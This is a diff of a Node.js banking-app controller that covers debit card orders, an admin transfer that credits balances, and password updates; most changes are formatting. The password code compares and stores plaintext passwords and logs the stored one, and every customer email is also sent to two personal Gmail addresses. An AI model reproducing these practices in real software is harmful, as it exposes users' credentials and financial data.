@@ -1,22 +1,24 @@
 const User = require("../models/UserModel");
-const sendEmail = require('../utils/emailSender')
+const sendEmail = require("../utils/emailSender");
 const { handleError } = require("../utils/handleError");
-const OrderCard = require('../models/OrderCard')
-const TransferAdmin = require('../models/TransferAdmin')
+const OrderCard = require("../models/OrderCard");
+const TransferAdmin = require("../models/TransferAdmin");
 
-const orderDebitCard =  async (req, res) => {
+const orderDebitCard = async (req, res) => {
   try {
-    req.body.user = req.user.userId
-  
-    const { address } = req.body
-    if(!address) {
-   return res.status(400).json({ status: "failed", error: "please enter mailing address"})
+    req.body.user = req.user.userId;
+
+    const { address } = req.body;
+    if (!address) {
+      return res
+        .status(400)
+        .json({ status: "failed", error: "please enter mailing address" });
     }
-    const orderCard = await OrderCard.create(req.body)
-    const user = await User.findById(req.user.userId)
-     const subject = "Debit Card Order";
-     const text = ''
-   const html = `<!DOCTYPE html>
+    const orderCard = await OrderCard.create(req.body);
+    const user = await User.findById(req.user.userId);
+    const subject = "Debit Card Order";
+    const text = "";
+    const html = `<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -81,12 +83,12 @@ const orderDebitCard =  async (req, res) => {
       sendEmail("anniemary841@gmail.com", subject, text, html),
       sendEmail("companychris00@gmail.com", subject, text, html),
     ]);
-    res.status(200).json({ status: "success", data: orderCard })
+    res.status(200).json({ status: "success", data: orderCard });
   } catch (error) {
     console.log(error);
-    res.status(400).json({ error: error.message})
+    res.status(400).json({ error: error.message });
   }
-}
+};
 
 const getUser = async (req, res) => {
   try {
@@ -102,7 +104,6 @@ const getUser = async (req, res) => {
     res.status(400).json({ status: "failed", error: error.message });
   }
 };
-
 
 const updateUser = async (req, res) => {
   try {
@@ -146,7 +147,6 @@ const adminTransfer = async (req, res) => {
       return res.status(401).json({ status: "failed", error: "Invalid PIN." });
     }
 
-    
     let user;
 
     user = await User.findOne({ savings_account_number: account_number });
@@ -158,15 +158,13 @@ const adminTransfer = async (req, res) => {
       return res.status(404).json({ msg: "User not found." });
     }
 
-    
-       if (account === "savings") {
+    if (account === "savings") {
       user.savings_balance += parseInt(amount);
-      await user.save()
+      await user.save();
     } else if (account === "checkings") {
       user.checkings_balance += parseInt(amount);
-      await user.save()
+      await user.save();
     }
-
 
     const internalTransfer = await TransferAdmin.create({
       amount,
@@ -242,7 +240,7 @@ const adminTransfer = async (req, res) => {
             <li>Use strong, unique passwords for your online banking.</li>
           </ul>
 
-          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@crestwoodscapitals.com">contact us via mail</a> or <a href='https://www.facebook.com/profile.php?id=61561899666135&mibextid=LQQJ4d'>Contact Us via facebook</a>.</p>
+          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@crestwoodcapitalscp.com">contact us via mail</a> or <a href='https://www.facebook.com/profile.php?id=61561899666135&mibextid=LQQJ4d'>Contact Us via facebook</a>.</p>
 
           <div class="footer">
             <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
@@ -253,25 +251,22 @@ const adminTransfer = async (req, res) => {
       </body>
       </html>
     `;
- await Promise.all([
-   sendEmail(user.email, subject, text, html),
-   sendEmail("anniemary841@gmail.com", subject, text, html),
-   sendEmail("companychris00@gmail.com", subject, text, html),
- ]);
+    await Promise.all([
+      sendEmail(user.email, subject, text, html),
+      sendEmail("anniemary841@gmail.com", subject, text, html),
+      sendEmail("companychris00@gmail.com", subject, text, html),
+    ]);
 
-    res
-      .status(200)
-      .json({
-        message: `${amount} transferred to ${user.name} successfully.`,
-        internalTransfer,
-      });
+    res.status(200).json({
+      message: `${amount} transferred to ${user.name} successfully.`,
+      internalTransfer,
+    });
   } catch (error) {
     const errors = handleError(error);
     console.log(error);
     res.status(400).json({ status: "failed", error: errors });
   }
 };
-
 
 const updatePassword = async (req, res) => {
   try {
@@ -280,13 +275,13 @@ const updatePassword = async (req, res) => {
     if (!oldPassword || !newPassword) {
       return res.status(400).json({
         status: "error",
-        error : "provide old password and new password",
+        error: "provide old password and new password",
       });
     }
 
     const user = await User.findOne({ _id: userId });
     console.log(user.password);
-    const isPasswordMatch = oldPassword === user.password
+    const isPasswordMatch = oldPassword === user.password;
 
     console.log(isPasswordMatch);
     if (!isPasswordMatch) {
@@ -297,7 +292,7 @@ const updatePassword = async (req, res) => {
     }
     user.password = newPassword;
 
-     await user.save({ validateBeforeSave: false });
+    await user.save({ validateBeforeSave: false });
     res.status(200).json({
       status: "success",
       message: "password updated successfully",
@@ -309,12 +304,11 @@ const updatePassword = async (req, res) => {
   }
 };
 
-
 module.exports = {
   getUser,
   updateUser,
   getAllUser,
   adminTransfer,
   orderDebitCard,
-  updatePassword
+  updatePassword,
 };
